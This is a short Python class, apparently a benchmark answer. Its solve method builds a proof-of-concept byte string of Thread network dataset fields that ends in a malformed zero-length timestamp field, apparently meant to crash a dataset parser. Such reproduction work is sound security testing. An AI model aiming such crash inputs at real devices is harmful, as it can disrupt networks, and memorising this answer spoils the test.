class Solution:
    def solve(self, src_path: str) -> bytes:
        pan_id = b'\x0b\x02\x00\x00'
        channel = b'\x0d\x02\x00\x0f'
        xpan_id = b'\x04\x08\x00\x00\x00\x00\x00\x00\x00\x00'
        prefix = b'\x05\x08\x00\x00\x00\x00\x00\x00\x00\x00'
        netkey = b'\x06\x10' + b'\x00' * 16
        pskc = b'\x07\x10' + b'\x00' * 16
        sec_policy = b'\x08\x03\x00\x00\x00'
        active_ts = b'\x00\x00'
        poc = pan_id + channel + xpan_id + prefix + netkey + pskc + sec_policy + active_ts
        return poc
